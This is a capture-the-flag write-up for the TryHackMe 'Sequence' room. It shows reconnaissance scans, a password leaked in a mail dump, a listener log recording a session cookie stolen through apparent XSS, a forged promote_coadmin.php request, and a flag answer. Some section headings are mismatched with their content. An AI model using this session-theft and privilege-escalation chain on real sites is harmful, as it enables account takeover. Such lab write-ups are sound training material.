<h1 align="center">Sequence</h1>
<p align="center"><img width="80px" src=""><br>
2025, September 18<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>500</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Chain multiple vulnerabilities to take control of a system.<br>
Access it <a href="https://tryhackme.com/room/sequence">here</a>.<br>
<img width="1200px" src=""></p>

<h1 align="center">Task 1 . Challenge</h1>


```bash
:~/Sequence# nmap -sC -sV -Pn -p- xx.xxx.xx.xx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Review Shop
```

<h2 align="center">/etc/hosts</h2>

```bash
:~/Sequence# nikto -h http://review.thm
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.91.178
+ Target Hostname:    review.thm
+ Target Port:        80
+ Start Time:         2025-09-26 19:24:49 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ Cookie phpMyAdmin created without the httponly flag
+ Cookie goto created without the httponly flag
+ Cookie back created without the httponly flag
+ Cookie pma_lang created without the httponly flag
+ Uncommon header 'referrer-policy' found, with contents: no-referrer
+ Uncommon header 'x-robots-tag' found, with contents: noindex, nofollow
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ Uncommon header 'x-content-security-policy' found, with contents: default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-webkit-csp' found, with contents: default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-permitted-cross-domain-policies' found, with contents: none
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self' ;script-src 'self' 'unsafe-inline' 'unsafe-eval' ;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-xss-protection' found, with contents: 1; mode=block
+ OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ /login.php: Admin login page/section found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 6544 items checked: 0 error(s) and 22 item(s) reported on remote host
+ End Time:           2025-09-26 19:24:57 (GMT1) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

<h2 align="center">nikto</h2>

```bash
xx.xxx.xx.xx review.thm
```

<h2 align="center">gobuster</h2>


```bash
:~/Sequence# gobuster dir -u http://review.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -k -e -t 60
...
http://review.thm/index.php            (Status: 200) [Size: 1694]
http://review.thm/javascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
...
http://review.thm/mail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
...
http://review.thm/phpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
http://review.thm/server-status        (Status: 403) [Size: 275]
http://review.thm/uploads              (Status: 301) [Size: 310] [--> http://review.thm/uploads/]
```

```bash
:~/Sequence# gobuster dir -u http://review.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x php,html -k -e -t 60
...
http://review.thm/chat.php             (Status: 302) [Size: 0] [--> login.php]
http://review.thm/contact.php          (Status: 200) [Size: 2246]
http://review.thm/dashboard.php        (Status: 302) [Size: 1400] [--> login.php]
http://review.thm/db.php               (Status: 200) [Size: 0]
http://review.thm/header.php           (Status: 200) [Size: 1400]
http://review.thm/index.php            (Status: 200) [Size: 1694]
http://review.thm/index.php            (Status: 200) [Size: 1694]
http://review.thm/javascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
http://review.thm/logout.php           (Status: 302) [Size: 0] [--> index.php]
http://review.thm/login.php            (Status: 200) [Size: 1944]
http://review.thm/mail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
http://review.thm/new.html             (Status: 200) [Size: 562]
http://review.thm/phpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
http://review.thm/server-status        (Status: 403) [Size: 275]
http://review.thm/settings.php         (Status: 302) [Size: 0] [--> login.php]
http://review.thm/uploads              (Status: 301) [Size: 310] [--> http://review.thm/uploads/]
```

```bash
:~/Sequence# gobuster dir -u http://review.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -e -t 60
...
http://review.thm/uploads              (Status: 301) [Size: 310] [--> http://review.thm/uploads/]
http://review.thm/mail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
http://review.thm/javascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
http://review.thm/phpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
http://review.thm/server-status        (Status: 403) [Size: 275]
Progress: 220560 / 220561 (100.00%)
```

<h2 align="center">ffuf</h2>

```bash
:~/Sequence# ffuf -u 'http://review.thm/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -mc all -t 100 -fc 403,404 -e .php -ic
...
contact.php             [Status: 200, Size: 2246, Words: 388, Lines: 87]
                        [Status: 200, Size: 1694, Words: 234, Lines: 69]
index.php               [Status: 200, Size: 1694, Words: 234, Lines: 69]
login.php               [Status: 200, Size: 1944, Words: 329, Lines: 79]
mail                    [Status: 301, Size: 315, Words: 20, Lines: 10]
header.php              [Status: 200, Size: 1400, Words: 204, Lines: 60]
uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10]
chat.php                [Status: 302, Size: 0, Words: 1, Lines: 1]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
settings.php            [Status: 302, Size: 0, Words: 1, Lines: 1]
dashboard.php           [Status: 302, Size: 1400, Words: 204, Lines: 60]
phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10]
                        [Status: 200, Size: 1694, Words: 234, Lines: 69]
```

<h2 align="center">dirbuster</h2>

```bash
:~/Sequence# dirsearch -u http://review.thm/ -r -x 401,402,403,404

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Sequence/reports/http_review.thm/__25-09-26_xx-xx-xx.txt

Target: http://review.thm/

[xx:xx:xx] Starting: 
[xx:xx:xx] 302 -    0B  - /chat.php  ->  login.php
[xx:xx:xx] 200 -  764B  - /contact.php
[xx:xx:xx] 302 -    1KB - /dashboard.php  ->  login.php
[xx:xx:xx] 200 -    0B  - /db.php
[xx:xx:xx] 200 -  576B  - /header.php
[xx:xx:xx] 301 -  313B  - /javascript  ->  http://review.thm/javascript/
Added to the queue: javascript/
[xx:xx:xx] 200 -  747B  - /login.php
[xx:xx:xx] 302 -    0B  - /logout.php  ->  index.php
[xx:xx:xx] 200 -  450B  - /mail/
Added to the queue: mail/
[xx:xx:xx] 301 -  307B  - /mail  ->  http://review.thm/mail/
[xx:xx:xx] 200 -  357B  - /new.html
[xx:xx:xx] 301 -  313B  - /phpmyadmin  ->  http://review.thm/phpmyadmin/
Added to the queue: phpmyadmin/
[xx:xx:xx] 200 -    3KB - /phpmyadmin/doc/html/index.html
[xx:xx:xx] 200 -    3KB - /phpmyadmin/
[xx:xx:xx] 200 -    3KB - /phpmyadmin/index.php
[xx:xx:xx] 302 -    0B  - /settings.php  ->  login.php
[xx:xx:xx] 301 -  310B  - /uploads  ->  http://review.thm/uploads/
Added to the queue: uploads/
[xx:xx:xx] 200 -  403B  - /uploads/

[xx:xx:xx] Starting: javascript/

[xx:xx:xx] Starting: mail/
[xx:xx:xx] 200 -  442B  - /mail/dump.txt

[xx:xx:xx] Starting: phpmyadmin/
[xx:xx:xx] 301 -  316B  - /phpmyadmin/js  ->  http://review.thm/phpmyadmin/js/
Added to the queue: phpmyadmin/js/
[xx:xx:xx] 301 -  317B  - /phpmyadmin/doc  ->  http://review.thm/phpmyadmin/doc/
Added to the queue: phpmyadmin/doc/
[xx:xx:xx] 200 -   22KB - /phpmyadmin/favicon.ico
[xx:xx:xx] 200 -    7KB - /phpmyadmin/js/config.js
[xx:xx:xx] 301 -  317B  - /phpmyadmin/sql  ->  http://review.thm/phpmyadmin/sql/
Added to the queue: phpmyadmin/sql/
[xx:xx:xx] 301 -  320B  - /phpmyadmin/themes  ->  http://review.thm/phpmyadmin/themes/
Added to the queue: phpmyadmin/themes/

[xx:xx:xx] Starting: uploads/

[xx:xx:xx] Starting: phpmyadmin/js/
[xx:xx:xx] 200 -    5KB - /phpmyadmin/js/common.js
[xx:xx:xx] 200 -    6KB - /phpmyadmin/js/export.js
[xx:xx:xx] 200 -    9KB - /phpmyadmin/js/sql.js

[xx:xx:xx] Starting: phpmyadmin/doc/
xx:xx:xx] 301 -  322B  - /phpmyadmin/doc/html  ->  http://review.thm/phpmyadmin/doc/html/
Added to the queue: phpmyadmin/doc/html/

[xx:xx:xx] Starting: phpmyadmin/sql/

[xx:xx:xx] Starting: phpmyadmin/themes/

[xx:xx:xx] Starting: phpmyadmin/doc/html/
[xx:xx:xx] 200 -   44KB - /phpmyadmin/doc/html/config.html
[xx:xx:xx] 200 -   48KB - /phpmyadmin/doc/html/faq.html
[xx:xx:xx] 200 -    1KB - /phpmyadmin/doc/html/search.html
[xx:xx:xx] 200 -    2KB - /phpmyadmin/doc/html/settings.html
[xx:xx:xx] 200 -    2KB - /phpmyadmin/doc/html/user.html

Task Completed
```


<h2 align="center">review.thm</h2>

<img width="1125" height="346" alt="image" src="https://github.com/user-attachments/assets/63bd0e1d-e97b-419b-a19b-0503fce19673" />

<br>
<br>

<h2 align="center">review.thm/login.php</h2>

<img width="1128" height="407" alt="image" src="https://github.com/user-attachments/assets/35b96393-88ff-4afb-8fd1-ff1cd44fe9d8" />

<br>
<br>
<h2 align="center">review.thm/contact.php</h2>

<img width="1131" height="497" alt="image" src="https://github.com/user-attachments/assets/3bc9a528-955e-407c-b4a0-8088223ced95" />

<br>
<br>
<h2 align="center">review.thm/new.html</h2>

<img width="1127" height="190" alt="image" src="https://github.com/user-attachments/assets/038282a4-c0a4-4d18-8eec-3f74a944aed6" />

<br>
<br>
<h2 align="center">review.thm/phpmyadmin/index.php</h2>

<img width="1129" height="487" alt="image" src="https://github.com/user-attachments/assets/ba1075b5-10b4-4fb0-8e8d-54b924fb9628" />

<br>
<br>

<h2 align="center">review.thm/phpmyadmin/doc/html/index.html</h2>
<p>

- phpMyAdmin 4.9.5</p>

<img width="1120" height="183" alt="image" src="https://github.com/user-attachments/assets/68d09a8a-a664-458c-9e44-29014d01bc1b" />


<br>
<br>
<h2 align="center">review.thm/mail/dump.txt</h2>
<p>

- software@review.thm<br>
- product@review.thm<br>
- Finance panel = /finance.php<br>
- Lottery panel = /lottery.php<br>
- completed 8-characer alphanumeric password = (S60u}f5j)<br>
- Robert</p>

```bash
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert
```

<h2 align="center">review.thm/uploads/</h2>

<img width="1127" height="313" alt="image" src="https://github.com/user-attachments/assets/fe9482f5-a406-4c60-b9e7-fc9088c9af5e" />



<p>
        
- finance.php<br>
- lottery.php(S60u}f5j)</p>

<img width="1115" height="305" alt="image" src="https://github.com/user-attachments/assets/063c4453-6b0f-435c-99a1-ecaeaf943a9d" />


<img width="1132" height="361" alt="image" src="https://github.com/user-attachments/assets/8148f26e-536c-4070-bea6-05c4b7b275a4" />



<img width="1130" height="498" alt="image" src="https://github.com/user-attachments/assets/813e396f-c952-4625-8847-625000bde1b5" />





<img width="1060" height="524" alt="image" src="https://github.com/user-attachments/assets/1d2b7c20-cd75-458a-b948-ec8201690f15" />



~/Sequence# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.83.96 - - [23/Sep/2025 20:28:25] "GET /testing.js HTTP/1.1" 200 -
10.201.83.96 - - [23/Sep/2025 20:28:25] "GET /?cookie=PHPSESSID=dg55qdecrcaibv591scv5j0ael HTTP/1.1" 200 -


<img width="697" height="138" alt="image" src="https://github.com/user-attachments/assets/1ad3df60-a7e3-4033-bb17-287476101849" />


<img width="957" height="407" alt="image" src="https://github.com/user-attachments/assets/d4849f9a-2e2d-4672-9497-16d7e60cf07f" />




<p>1.1. What is the flag value after logging in as <strong>mod</strong?<br>
        <code></code>THM{M0dH@ck3dPawned007}</p>code></p>


<img width="1118" height="333" alt="image" src="https://github.com/user-attachments/assets/c59001e2-4c41-4ab4-9ef1-54af88a65148" />

<img width="952" height="629" alt="image" src="https://github.com/user-attachments/assets/0d2c5e81-e1b9-428f-8a21-3a1bfa13d122" />

MD5

<img width="1353" height="258" alt="image" src="https://github.com/user-attachments/assets/bc2c5c66-cc9f-43b1-857a-84b9002bf35d" />



<img width="951" height="620" alt="image" src="https://github.com/user-attachments/assets/1059c46b-860c-4bd6-82ab-7bf8c85711d2" />


GET /promote_coadmin.php?username=ad148a3ca8bd0ef3b48c52454c493ec5&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3 HTTP/1.1
Host: reviewshop.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://reviewshop.thm/settings.php
Connection: keep-alive
Cookie: PHPSESSID=dg55qdecrcaibv591scv5j0ael
Priority: u=0


HTTP/1.1 200 OK
Date: Tue, 23 Sep 2025 19:42:24 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 90
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<div class='alert alert-danger'>This feature is currently only available for admins.</div>



        <img width="961" height="412" alt="image" src="https://github.com/user-attachments/assets/8acab50e-978e-475a-8dd3-664204b39b92" />

<img width="955" height="623" alt="image" src="https://github.com/user-attachments/assets/0c75661f-d026-4e74-a7cb-74907e0c14cd" />





